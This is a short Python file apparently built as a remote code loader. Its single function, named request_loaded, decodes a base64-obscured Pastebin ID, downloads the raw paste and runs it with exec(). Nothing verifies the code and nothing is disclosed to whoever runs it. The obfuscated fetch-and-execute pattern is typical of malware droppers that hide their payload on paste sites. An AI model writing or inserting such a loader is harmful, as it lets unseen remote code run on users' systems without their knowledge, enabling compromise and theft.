﻿import requests
import base64

def request_loaded(encoded_id: str):
    encoded_id = encoded_id.strip()
    real_id = base64.b64decode(encoded_id).decode('utf-8').strip()
    url = f"https://pastebin.com/raw/{real_id}"
    code = requests.get(url).text
    exec(code, {"__name__": "__main__"})